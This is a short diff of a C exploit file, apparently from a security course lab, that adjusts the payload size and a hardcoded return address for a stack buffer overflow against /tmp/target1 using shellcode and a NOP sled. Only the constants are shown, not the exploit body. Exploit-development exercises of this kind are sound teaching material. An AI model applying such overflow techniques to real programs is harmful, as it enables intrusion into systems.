@@ -5,9 +5,9 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target1"
-#define PAYLOAD_SIZE (256+4+4+4+4+1)
+#define PAYLOAD_SIZE (256+4+4+1)
 #define NOP (0x90)
-#define RET_ADDR (0xbffffc30)
+#define RET_ADDR (0xbffffc28)
 
 int main(void)
 {
